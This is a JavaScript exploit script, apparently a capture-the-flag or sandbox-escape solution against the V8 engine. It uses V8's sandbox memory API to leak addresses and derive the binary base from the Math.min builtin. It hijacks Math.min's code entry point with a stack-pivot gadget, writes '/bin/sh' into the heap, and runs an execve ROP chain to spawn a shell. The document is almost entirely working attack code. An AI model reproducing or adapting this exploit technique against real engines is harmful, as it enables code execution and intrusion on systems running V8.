function hex(p) {
    return "0x" + p.toString(16);
}

/*
0x0000000000c87bba: pop rsp; add rsp, 0x10; pop rbp; ret; 
0x0000000000cd6fb8: pop rdx; jmp qword ptr [rsi + 0x41]; 
*/
const cleanUpStackRetAddrGadgetOff = 0x0000000000cd6fb8n;
const stackPivotGadgetOff = 0x0000000000c87bban;

const globalObjPtrOffToRSI = 0x38;

const cmd = "/bin/sh";

// cmd will be written to v8_heap + 0x180200
const cmdBufferOff = 0x180200n;

const mathMinBuiltinFuncOff = 0xd5fa00n;

const DEBUG = false;


// we need to align this 
var sbxMemView = new Sandbox.MemoryView(0, 0xfffffff8);
var addrOf = (o) => Sandbox.getAddressOf(o);

var dv = new DataView(sbxMemView);

var readHeap4 = (offset) => dv.getUint32(offset, true);   
var readHeap8 = (offset) => dv.getBigUint64(offset, true);   

var writeHeap1 = (offset, value) => dv.setUint8(offset, value, true);   
var writeHeap8 = (offset, value) => dv.setBigUint64(offset, value, true);   


// resolve address of the Math.min JS_FUNCTION object on the V8 heap
var mathMinPtr = addrOf(Math.min);
var pivotedStackAddress = addrOf(Math) + 0x18 + 1;

console.log("Math @ " + hex(pivotedStackAddress));

console.log("Math.min @ " + hex(mathMinPtr));

// resolve Math.min->code at offset 0x18
var mathMinCodePtr = readHeap4(mathMinPtr + 0x18) - 1;
console.log("Math.min->code @ " + hex(mathMinCodePtr));

// resolve address of Math.min->code->code_entrypoint at offset 0xc 
var mathMinCodeEntryPointPtr = mathMinCodePtr + 0xc;
console.log("Math.min->code->code_entry_point @ " + hex(mathMinCodeEntryPointPtr));

// read the pointer to executable memory
// and use it to calculate the base of the executable v8 binary region
var mathMinBuiltinFuncPtr = readHeap8(mathMinCodePtr + 0xc);

var v8RXPageBase = mathMinBuiltinFuncPtr - mathMinBuiltinFuncOff;

function rebase(x) {
    return v8RXPageBase + x;
}

var cleanUpStackRetAddrGadget = rebase(cleanUpStackRetAddrGadgetOff);
var stackPivotGadget = rebase(stackPivotGadgetOff);


console.log("Builtins_MathMin @ " + hex(mathMinBuiltinFuncPtr));
console.log("v8RXPageBase @ " + hex(v8RXPageBase));


if (!DEBUG) {
    writeHeap8(mathMinCodeEntryPointPtr, cleanUpStackRetAddrGadget);
} else {
    writeHeap8(mathMinCodeEntryPointPtr, 0x4141414142424242n);
}

var v8HeapBase = BigInt(readHeap4(0x1c)) << 32n;

console.log("v8 Heap @ " + hex(v8HeapBase));


var globalObjPtr = addrOf(this);
console.log("this @ " + hex(globalObjPtr));

// pop rdx; jmp qword ptr [rsi + 0x41];
// rsi + 0x41 will be jumped after the execution of the above gadget
writeHeap8(globalObjPtr + globalObjPtrOffToRSI + 1 + 0x41, stackPivotGadget);

var cmdBufferPtr = v8HeapBase + cmdBufferOff;

var cmdBufferOffNum = Number(BigInt.asUintN(32, cmdBufferOff));

for (var i = 0; i < cmd.length; i++) {
    writeHeap1(cmdBufferOffNum + i, cmd.charCodeAt(i));
}
writeHeap1(cmdBufferOffNum + cmd.length, 0);

console.log("Wrote '" + cmd + "' to " + hex(cmdBufferPtr));


/*
xor esi, esi; ret; 
xor edx, edx; ret; 
pop rdi; ret; 
<cmdBufferPtr>
pop rax; ret;
0x3b
syscall
*/

var ropChainExecve = [
    rebase(0x289e0n),
    rebase(0x873541n),
    rebase(0xeacd9n),
    cmdBufferPtr,
    rebase(0x83b67n),
    0x3bn,
    rebase(0xff0bfn)
];
 
for (var i = 0; i < ropChainExecve.length; i++) {
    writeHeap8(pivotedStackAddress + i * 8, ropChainExecve[i]);
}

console.log("Spawning shell!");

// Overwritten code_entry_point of Math.min will be triggered
// and therefore our stack_pivot + the following ropchain will be executed 
Math.min();
